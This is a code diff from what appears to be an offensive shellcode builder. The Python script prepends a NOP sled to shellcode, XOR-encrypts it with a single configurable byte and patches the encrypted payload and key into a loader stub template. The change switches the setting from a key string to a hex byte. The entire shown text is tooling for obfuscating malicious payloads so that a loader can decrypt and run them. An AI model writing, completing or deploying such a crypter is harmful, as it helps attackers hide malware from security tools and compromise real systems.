@@ -7,7 +7,7 @@ config = ConfigParser()
 config.read(".conf") 
 
 ROR_VALUE = config.getint("Payload", "ror_value")
-ENCRYPTION_KEY = config.get("Payload", "encryption_key")
+ENCRYPTION_BYTE = config.get("Payload", "encryption_byte")
 PAYLOAD_FILE = config.get("Payload", "filename")
 STUB_FILE = config.get("Loader", "filename")
 
@@ -18,7 +18,7 @@ SHELLCODE_PREFIX = "909090"
 def main():
     print("===========CONFIG==========")
     print(f"ROR value: {ROR_VALUE}")
-    print(f"Encryption key: {ENCRYPTION_KEY}")
+    print(f"Encryption byte: {ENCRYPTION_BYTE}")
     print("===========================\n")
 
     print("===========PAYLOAD==============")
@@ -43,18 +43,18 @@ def main():
 
     instructions = SHELLCODE_PREFIX+instructions
     # Encrypt the shellcode
-    if ENCRYPTION_KEY != "":
+    if ENCRYPTION_BYTE != "":
         print("===========ENCRYPTION==============")
         print(instructions)
-        print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
-        encrypted_instructions = xor_encrypt_decrypt(instructions, ENCRYPTION_KEY)
+        print(f"\nEncrypted with '{ENCRYPTION_BYTE}'\n")
+        encrypted_instructions = xor_encrypt_decrypt(instructions, int(ENCRYPTION_BYTE, 16))
         print(encrypted_instructions)
         print("===================================\n")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
-        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", ENCRYPTION_KEY)
+        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", ENCRYPTION_BYTE)
     else:
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
-        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", "")
+        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", "")
 
     # Need to decide if 909090 xor KEY is constant to unxor later, maybe no need to
     
